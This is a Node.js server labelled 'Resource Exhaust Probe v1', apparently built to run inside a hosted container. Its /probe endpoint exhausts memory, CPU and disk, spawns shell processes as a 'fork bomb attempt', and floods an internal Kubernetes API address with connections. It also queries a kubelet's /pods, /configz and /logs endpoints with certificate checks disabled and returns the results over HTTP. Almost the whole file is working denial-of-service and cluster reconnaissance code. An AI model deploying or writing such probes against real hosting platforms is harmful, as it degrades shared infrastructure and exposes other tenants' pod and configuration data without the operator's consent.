const http = require("http");
const https = require("https");
const os = require("os");
const fs = require("fs");

let results = {};

// 1. Memory exhaustion test - allocate memory until OOM
async function testMemoryExhaust(targetMB = 2000) {
  results.memoryTest = { allocations: [] };
  const chunks = [];
  let allocated = 0;
  
  try {
    while (allocated < targetMB) {
      const chunk = Buffer.alloc(50 * 1024 * 1024); // 50MB chunks
      chunks.push(chunk);
      allocated += 50;
      results.memoryTest.allocations.push(`${allocated}MB`);
    }
    results.memoryTest.success = true;
    results.memoryTest.totalAllocated = allocated + "MB";
  } catch(e) {
    results.memoryTest.error = e.message;
    results.memoryTest.totalAllocated = allocated + "MB";
  }
  
  // Clear memory
  chunks.length = 0;
  global.gc && global.gc();
}

// 2. CPU exhaustion test - intensive computation
function testCPUExhaust(durationMs = 5000) {
  results.cpuTest = {};
  const start = Date.now();
  let iterations = 0;
  
  while (Date.now() - start < durationMs) {
    // CPU-intensive operations
    Math.random() * Math.random();
    iterations++;
  }
  
  results.cpuTest.iterations = iterations;
  results.cpuTest.durationMs = durationMs;
}

// 3. Disk write test - fill disk space
async function testDiskExhaust(targetMB = 500) {
  results.diskTest = {};
  const filePath = "/tmp/disk_test_" + Date.now();
  
  try {
    const chunk = Buffer.alloc(10 * 1024 * 1024); // 10MB
    let written = 0;
    const fd = fs.openSync(filePath, "w");
    
    while (written < targetMB) {
      fs.writeSync(fd, chunk);
      written += 10;
    }
    
    fs.closeSync(fd);
    fs.unlinkSync(filePath);
    
    results.diskTest.success = true;
    results.diskTest.totalWritten = written + "MB";
  } catch(e) {
    results.diskTest.error = e.message;
    try { fs.unlinkSync(filePath); } catch(e2) {}
  }
}

// 4. Fork bomb attempt (should be blocked)
function testForkBomb() {
  results.forkTest = {};
  
  try {
    const { execSync } = require("child_process");
    // Attempt mild fork - not a real fork bomb but tests limits
    const result = execSync("for i in $(seq 1 10); do sleep 0.1 & done; wait", {
      timeout: 5000,
      encoding: "utf8"
    });
    results.forkTest.success = true;
    results.forkTest.output = result;
  } catch(e) {
    results.forkTest.error = e.message;
  }
}

// 5. Network flood test (internal only)
async function testNetworkFlood() {
  results.networkFlood = {};
  
  const target = "10.100.0.1"; // K8s API
  const port = 443;
  let successfulConnections = 0;
  
  try {
    const net = require("net");
    const promises = [];
    
    for (let i = 0; i < 100; i++) {
      promises.push(new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(1000);
        socket.on("connect", () => {
          successfulConnections++;
          socket.destroy();
          resolve(true);
        });
        socket.on("error", () => { socket.destroy(); resolve(false); });
        socket.on("timeout", () => { socket.destroy(); resolve(false); });
        socket.connect(port, target);
      }));
    }
    
    await Promise.all(promises);
    results.networkFlood.successfulConnections = successfulConnections;
    results.networkFlood.attempted = 100;
  } catch(e) {
    results.networkFlood.error = e.message;
  }
}

// 6. Kubelet API probe
async function probeKubelet() {
  results.kubelet = {};
  
  const endpoints = [
    "/pods",
    "/runningpods",
    "/metrics",
    "/configz",
    "/logs",
    "/spec"
  ];
  
  for (const endpoint of endpoints) {
    try {
      const resp = await new Promise((resolve, reject) => {
        https.get(`https://192.168.66.176:10250${endpoint}`, {
          rejectUnauthorized: false,
          timeout: 3000
        }, (res) => {
          let body = "";
          res.on("data", c => body += c);
          res.on("end", () => resolve({ status: res.statusCode, body: body.substring(0, 500) }));
        }).on("error", reject);
      });
      results.kubelet[endpoint] = resp;
    } catch(e) {
      results.kubelet[endpoint] = { error: e.message };
    }
  }
}

// Server
const server = http.createServer(async (req, res) => {
  results = {
    timestamp: new Date().toISOString(),
    system: {
      freeMem: os.freemem(),
      totalMem: os.totalmem(),
      cpus: os.cpus().length
    }
  };
  
  if (req.url === "/probe") {
    await testMemoryExhaust(1000); // 1GB
    testCPUExhaust(2000); // 2 seconds
    await testDiskExhaust(200); // 200MB
    testForkBomb();
    await testNetworkFlood();
    await probeKubelet();
    
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results, null, 2));
  } else if (req.url === "/kubelet") {
    await probeKubelet();
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results, null, 2));
  } else {
    res.writeHead(200);
    res.end("Resource Exhaust Probe v1");
  }
});

server.listen(process.env.PORT || 3000);
console.log("Server started");
